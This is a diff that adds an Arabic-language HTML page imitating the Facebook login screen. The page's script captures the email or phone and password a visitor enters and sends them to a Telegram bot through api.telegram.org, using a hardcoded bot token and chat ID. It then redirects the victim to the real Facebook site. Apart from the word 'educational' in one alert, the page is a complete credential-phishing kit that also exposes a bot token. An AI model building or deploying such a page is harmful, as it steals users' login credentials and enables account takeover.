@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 3.5em;
+            color: #1877f2;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 400px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin: 15px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-box">
+            <form onsubmit="handleSubmit(event)">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة السر" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+                <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
+                <hr>
+                <button type="button" class="create-account">إنشاء حساب جديد</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات إلى تيليجرام
+            const botToken = '8112137805:AAG-uOgy7TU0fv3bItibvRDCfWT8aVj0agk';
+            const chatId = '7249192282';
+            const message = `بيانات جديدة:\nايميل: ${email}\nكلمة سر: ${password}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                });
+
+                const data = await response.json();
+                if (data.ok) {
+                    alert('تم تسجيل الدخول بنجاح! (تعليمي)');
+                    window.location.href = 'https://facebook.com';
+                } else {
+                    alert('حدث خطأ في الإرسال!');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ في الاتصال!');
+            }
+        }
+    </script>
+</body>
+</html>
